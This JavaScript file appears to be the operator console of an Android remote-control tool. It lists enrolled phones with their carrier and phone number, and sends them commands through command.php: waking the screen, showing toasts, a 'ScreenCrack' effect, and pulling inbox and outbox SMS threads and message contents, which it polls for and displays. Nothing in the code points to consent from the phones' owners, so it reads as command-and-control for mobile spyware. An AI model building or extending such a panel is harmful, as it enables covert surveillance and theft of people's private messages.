var globals = globals || {};
globals.initialized = false;
globals.buttons = {}
globals.forms = {}
globals.divs = {}
globals.clients = []

var sendCommand = function(fn, args) {
	globals.clients.forEach(function(client) {
		if (args != undefined) {
			$.post(
				"command.php",
				{
					"command": "sendCommand",
					"fn": fn,
					"client_id": client,
					"args": args
				}
			)
		} else {
			$.post(
				"command.php",
				{
					"command": "sendCommand",
					"fn": fn,
					"client_id": client
				}
			)
		}
	});
}

var setupGlobals = function() {
	globals.buttons.wake_screen = $("#btn-screen-on");
	globals.buttons.toast_short = $("#btn-short-toast")
	globals.buttons.toast_long = $("#btn-long-toast")
	globals.buttons.open_gl = $("#btn-open-gl");
	globals.buttons.screen_crack = $("#btn-screen-crack");
	globals.buttons.pong = $("#btn-pong")
	globals.buttons.sms_threads = $("#btn-get-sms-threads");
	globals.buttons.get_sms = $("#btn-get-sms");
	
	globals.forms.toast_text = $("#toast_message_input");
	globals.forms.thread_id = $("#thread_input")

	globals.divs.client_container = $("#client-container");
	globals.divs.messages = $("#notification-center");
	globals.initialized = true;
}

var initButtonHandlers = function() {
	$(".client").click(function() {
		var elem = $(this)[0];
		var client_id = elem.childNodes[0].innerText;
		var idx = $.inArray(client_id, globals.clients);
		if (idx == -1) {
			globals.clients.push(client_id);
			$(this).css("background-color", "#D1D1D1");
		} else {
			globals.clients.splice(idx, 1);
			$(this).css("background-color", "#ffffff");
		}
	});
	
	globals.buttons.wake_screen.click( function() {
		globals.clients.forEach(function(client) {
			$.post("command.php", {"command": "sendCommand", "fn": "ScreenOn", "client_id": client});
		});
	});
	
	globals.buttons.toast_short.click( function() {
		var toastText = globals.forms.toast_text.val();
		sendCommand("Toast", [
			toastText,
			"SHORT"
		]);
	});
	
	globals.buttons.toast_long.click( function() {
		var toastText = globals.forms.toast_text.val();
		sendCommand("Toast", [
			toastText,
			"LONG"
		]);
	});
	
	globals.buttons.open_gl.click( function() {
		sendCommand("OpenGL");
	});
	
	globals.buttons.screen_crack.click( function() {
		sendCommand("ScreenCrack");
	});
	
	globals.buttons.pong.click( function() {
		sendCommand("Pong");
	});
	
	globals.buttons.sms_threads.click( function() {
		sendCommand("GetThreads");
		sendCommand("GetThreads", ["OUTBOX"]);
	});
	
	globals.buttons.get_sms.click( function() {
		if(globals.forms.thread_id.val() != "")
			sendCommand("GetMessages", [
				globals.forms.thread_id.val()
			]);
	});
}

var createClientDiv = function(id, carrier, number) {
	var div = document.createElement("li");
	var id_elem = document.createElement("div");
	var num_elem = document.createElement("div");
	var carrier_elem = document.createElement("div");
	id_elem.setAttribute("id", "client_id");
	id_elem.innerHTML = id;
	num_elem.setAttribute("id", "client_number");
	num_elem.innerHTML = number;
	carrier_elem.setAttribute("id", "client_provider");
	carrier_elem.innerHTML = carrier;
	div.appendChild(id_elem);
	div.appendChild(num_elem);
	div.appendChild(carrier_elem);
	div.setAttribute("class", "list-group-item client");
	return div;
}

var createMsgDiv = function(message, msg_type, id, timestamp) {
	var div = document.createElement("li");
	var notification_span = document.createElement("span");
	var badge = document.createElement("badge");
	var msg_div = document.createElement("div");
	div.setAttribute("class", "list-group-item notification");
	notification_span.setAttribute("class", "label label-success");
	notification_span.innerHTML = id;
	badge.setAttribute("class", "badge");
	badge.innerHTML = timestamp;
	switch(msg_type) {
		case "MESSAGE_THREAD_RECV": {
			msg_div.setAttribute("class", "message-hl");
			msg_div.innerHTML = "Thread Information";
			msg_div.onclick = function() {
				$.post(
					"command.php",
					{"command": "getMessages", "client_id": message},
					function(result) {
						var thread_info = JSON.parse(result).messages[0].message;
						var something = window.open("data:text/json," + encodeURIComponent(JSON.stringify(JSON.parse(thread_info), null, 4)), "_blank");	
						something.focus();				
					}
				)
			};
			break;
		}
		case "MESSAGE_SMS_RECV": {
			msg_div.setAttribute("class", "message-hl");
			msg_div.innerHTML = "SMS Thread";
			msg_div.onclick = function() {
				$.post(
					"command.php",
					{"command": "getMessages", "client_id": message},
					function(result) {
						alert(result);
						var msg_info = JSON.parse(result).messages[0].message;
						var something = window.open("data:text/json," + encodeURIComponent(JSON.stringify(JSON.parse(msg_info), null, 4)), "_blank");	
						something.focus();				
					}
				)
			};
			break;
		}
		case "SMS_THREAD_INFO_INBOX": {
			return undefined;
		}
		case "SMS_THREAD_INFO_OUTBOX": {
			return undefined;
		}
		case "SMS_THREAD_OBJECT": {
			return undefined;
		}
		default: {
			msg_div.setAttribute("class", "message-text");
			msg_div.innerHTML= message;
		}
	}
	div.appendChild(notification_span);
	div.appendChild(badge);
	div.appendChild(msg_div);
	return div;
}

var populateClients = function() {
	$.post( "command.php", {"command": "getClients"}, function( result ) {
			var json = JSON.parse(result);
			json['clients'].forEach(function(client) {
				var object_id = client['objectId'];
				var carrier = client['carrier'];
				var phone_number = client['phoneNumber'];
				var div = createClientDiv(object_id, carrier, phone_number);
				globals.divs.client_container.append(div);
				}
			);
			initButtonHandlers();
	});
}

var initMessages = function() {
	$.post( "command.php", {"command": "getMessages"}, function( result ) {
        var msg_contents = JSON.parse(result);
		if (msg_contents && msg_contents.count > 0) {
			msg_contents.messages.forEach( function(message) {
				var element = createMsgDiv(message.message, message.message_type, message.objectId, message.time);
				if (element != undefined)
					globals.divs.messages.prepend(element);
			});
		}
    });
}

var messageLoop = function() {
	$.post( "command.php", {"command": "getUnreadMessages"}, function( result ) {
        var msg_contents = JSON.parse(result);
		if (msg_contents && msg_contents.count > 0) {
			msg_contents.messages.forEach( function(message) {
				var element = createMsgDiv(message.message, message.message_type, message.objectId, message.time);
				if (element != undefined)
					globals.divs.messages.prepend(element);
			});
		}
    });
}

$(document).ready(function() {
	setupGlobals();	
	if (globals.initialized != true) {
		alert("We have failed to setup some global variables :(");
	}
	populateClients();
	initMessages("getMessages");
	setInterval(messageLoop, 5000);	//listen for incoming messages
});